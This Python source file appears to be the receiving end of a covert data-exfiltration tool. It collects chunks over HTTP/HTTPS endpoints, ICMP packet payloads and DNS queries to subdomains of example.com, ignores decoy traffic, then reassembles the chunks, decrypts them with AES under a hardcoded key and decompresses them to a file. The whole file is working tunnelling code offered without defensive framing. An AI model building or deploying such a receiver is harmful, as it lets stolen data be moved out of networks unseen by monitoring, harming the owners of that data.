import os
import threading
import zlib
import base64
import hashlib
import ssl
import time
from flask import Flask, request, jsonify
from scapy.all import IP, ICMP, UDP, DNS, DNSQR, Raw, sniff
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import unpad
import logging

# Configuration
SECRET_KEY = "mysecretkey12345"
stop_sniffer = threading.Event()
dict_lock = threading.Lock()
received_chunks = {}
last_chunk_time = time.time()  # Initialize last chunk time

# Flask Server for HTTP and HTTPS Reception
app = Flask(__name__)

@app.route('/acknowledge_chunks', methods=['GET'])
def acknowledge_chunks():
    with dict_lock:
        received_indices = list(received_chunks.keys())
    return jsonify({'received_indices': received_indices}), 200

@app.route('/receive_payload', methods=['POST'])
def receive_payload():
    global last_chunk_time
    try:
        data = request.json
        print(f"[HTTP/HTTPS - Debug] Received POST request: {data}")
        if not data or 'identifier' not in data or data['identifier'] != 'PAYLOAD':
            print("[HTTP/HTTPS] Invalid payload or missing identifier")
            return jsonify({"error": "Invalid payload"}), 400

        chunk_index = int(data['chunk_index'])
        chunk = base64.b64decode(data['chunk'].encode('ascii'))
        chunk_size = len(chunk)
        with dict_lock:
            if chunk_index not in received_chunks:
                received_chunks[chunk_index] = chunk
                print(f"[Receiver - HTTP/HTTPS] Received chunk index {chunk_index}: {chunk} (Size: {chunk_size} bytes)")
                last_chunk_time = time.time()  # Update last received time
            else:
                print(f"[Receiver - HTTP/HTTPS] Duplicate chunk index {chunk_index} ignored.")
        return jsonify({"status": "success"}), 200
    except Exception as e:
        print(f"[Receiver - HTTP/HTTPS] Error: {e}")
        return jsonify({"error": str(e)}), 500

def start_http_server():
    print("[Flask HTTP] Starting HTTP server on port 5000...")
    app.run(host="0.0.0.0", port=5000, debug=False, use_reloader=False)

def start_https_server():
    print("[Flask HTTPS] Starting HTTPS server on port 5001...")
    context = ('cert.pem', 'key.pem')  # Ensure these files exist and are correct
    app.run(host="0.0.0.0", port=5001, ssl_context=context, debug=False, use_reloader=False)

def icmp_listener():
    def process_packet(packet):
        global last_chunk_time
        if packet.haslayer(ICMP) and packet.haslayer(Raw):
            data = packet[Raw].load
            if data.startswith(b'PAYLOAD|'):
                parts = data.split(b'|', 2)
                if len(parts) == 3:
                    try:
                        chunk_index = int(parts[1].decode('ascii'))
                        chunk = parts[2]
                        with dict_lock:
                            if chunk_index not in received_chunks:
                                received_chunks[chunk_index] = chunk
                                print(f"[Receiver - ICMP] Received chunk index {chunk_index}: {chunk} (Size: {len(chunk)} bytes)")
                                last_chunk_time = time.time()  # Update last received time
                            else:
                                print(f"[Receiver - ICMP] Duplicate chunk index {chunk_index} ignored.")
                    except ValueError:
                        # Non-integer chunk_index, likely dummy traffic
                        pass
                    except Exception as e:
                        print(f"[Receiver - ICMP] Error processing chunk: {e}")

    print("[ICMP Listener] Starting ICMP listener...")
    sniff(filter="icmp",
          prn=process_packet,
          store=0,
          iface="eth0",  # Replace with your actual interface name
          stop_filter=lambda x: stop_sniffer.is_set())

def dns_listener():
    def process_packet(packet):
        global last_chunk_time
        if packet.haslayer(DNSQR):
            domain = packet[DNSQR].qname.decode('utf-8').rstrip('.')
            if domain.endswith('.example.com'):
                parts = domain.split('.')
                if len(parts) >= 3:
                    try:
                        chunk_index = int(parts[0])
                        chunk_b32 = parts[1]
                        # Add padding if necessary
                        padding = '=' * ((8 - len(chunk_b32) % 8) % 8)
                        chunk = base64.b32decode(chunk_b32 + padding)
                        with dict_lock:
                            if chunk_index not in received_chunks:
                                received_chunks[chunk_index] = chunk
                                print(f"[Receiver - DNS] Received chunk index {chunk_index}: {chunk} (Size: {len(chunk)} bytes)")
                                last_chunk_time = time.time()  # Update last received time
                            else:
                                print(f"[Receiver - DNS] Duplicate chunk index {chunk_index} ignored.")
                    except ValueError:
                        # Non-integer chunk_index, likely dummy traffic
                        pass  # Silently ignore
                    except Exception as e:
                        print(f"[Receiver - DNS] Error decoding chunk: {e}")

    print("[DNS Listener] Starting DNS listener...")
    sniff(filter="udp port 53",
          prn=process_packet,
          store=0,
          iface="eth0",  # Replace with your actual interface name
          stop_filter=lambda x: stop_sniffer.is_set())

def decrypt_and_decompress_payload(payload):
    try:
        key = hashlib.sha256(SECRET_KEY.encode('utf-8')).digest()
        iv = payload[:16]  # Extract the initialization vector (IV)
        cipher = AES.new(key, AES.MODE_CBC, iv)

        encrypted_data = payload[16:]
        if len(encrypted_data) % AES.block_size != 0:
            raise ValueError(f"Encrypted data length ({len(encrypted_data)}) is not a multiple of {AES.block_size}.")

        decrypted_padded = cipher.decrypt(encrypted_data)
        decrypted = unpad(decrypted_padded, AES.block_size)  # Unpad after decryption
        print(f"[Debug] Decrypted payload size: {len(decrypted)} bytes")
        decompressed = zlib.decompress(decrypted)
        print(f"[Debug] Decompressed payload size: {len(decompressed)} bytes")
        return decompressed
    except ValueError as ve:
        raise ValueError(f"Padding error or invalid encrypted data: {ve}")
    except zlib.error as ze:
        raise ValueError(f"Decompression error: {ze}")
    except Exception as e:
        raise ValueError(f"Error decrypting or decompressing payload: {e}")

def reassemble_payload():
    with dict_lock:
        if not received_chunks:
            print("[Reassembler] No chunks received.")
            return
        sorted_indices = sorted(received_chunks.keys())
        print(f"[Reassembler] Received chunks (sorted): {sorted_indices}")

        # Determine total_chunks based on the highest chunk index
        total_chunks = max(sorted_indices) + 1  # Assuming zero-indexed
        missing_chunks = set(range(total_chunks)) - set(sorted_indices)
        if missing_chunks:
            print(f"[Reassembler] Cannot reassemble payload. Missing chunks: {missing_chunks}")
            return

        try:
            sorted_chunks = [received_chunks[key] for key in sorted_indices]
            reassembled_payload = b''.join(sorted_chunks)
            print(f"[Reassembler] Reassembled payload size: {len(reassembled_payload)} bytes")
        except KeyError as e:
            print(f"[Reassembler] KeyError while sorting chunks: {e}")
            return

        # Validate payload alignment with AES block size
        if len(reassembled_payload) % 16 != 0:
            print(f"[Reassembler] Warning: Payload size ({len(reassembled_payload)}) "
                  f"is not aligned with AES block size (16 bytes). Attempting to trim excess bytes.")
            # Optionally, trim the excess bytes if you know the exact original size
            # For example, if the sender sends the original size as metadata

            # Since we don't have metadata, we'll attempt to unpad and handle errors
            try:
                decrypted_payload = decrypt_and_decompress_payload(reassembled_payload)
            except ValueError as ve:
                print(f"[Reassembler] Decryption failed due to padding error: {ve}")
                return
            except Exception as e:
                print(f"[Reassembler] Error decrypting payload: {e}")
                return
        else:
            try:
                decrypted_payload = decrypt_and_decompress_payload(reassembled_payload)
            except Exception as e:
                print(f"[Reassembler] Error decrypting payload: {e}")
                return

        if not decrypted_payload:
            print("[Reassembler] Failed to decrypt and decompress payload.")
            return

        output_file_path = 'rec.txt'
        with open(output_file_path, 'wb') as f:
            f.write(decrypted_payload)
        print(f"[Receiver] Reassembled and decrypted payload saved to '{output_file_path}'")

        print(f"[Receiver] Reception summary: Total chunks received = {len(received_chunks)}, "
              f"Missing chunks = {len(missing_chunks)}")

def verify_chunks():
    with dict_lock:
        total_chunks = len(received_chunks)
        print(f"[Verifier] Total chunks received: {total_chunks}")
        if max(received_chunks.keys(), default=-1) + 1 != total_chunks:
            print("[Verifier] Some chunks are missing. Reassembly might fail.")

def wait_for_chunks(timeout=300, no_new_chunks_timeout=10):
    start_time = time.time()
    while time.time() - start_time < timeout:
        with dict_lock:
            if received_chunks and (time.time() - last_chunk_time > no_new_chunks_timeout):
                return True
        time.sleep(1)
    print("[Main] Timeout waiting for chunks.")
    return False

# Main
if __name__ == "__main__":
    interface_name = "eth0"  # Replace with your actual interface name

    # Start servers and listeners
    threading.Thread(target=start_http_server, daemon=True).start()
    threading.Thread(target=start_https_server, daemon=True).start()
    threading.Thread(target=icmp_listener, daemon=True).start()
    threading.Thread(target=dns_listener, daemon=True).start()

    # Wait for payload to be received
    print("[Main] Waiting for payload to be received...")
    if not wait_for_chunks(timeout=300, no_new_chunks_timeout=10):  # 5 minutes timeout
        print("[Main] Timeout waiting for chunks. Exiting.")
        exit(1)

    # Verify and reassemble the payload
    verify_chunks()
    reassemble_payload()

    # Keep the main thread alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("[Main] Exiting.")
        stop_sniffer.set()
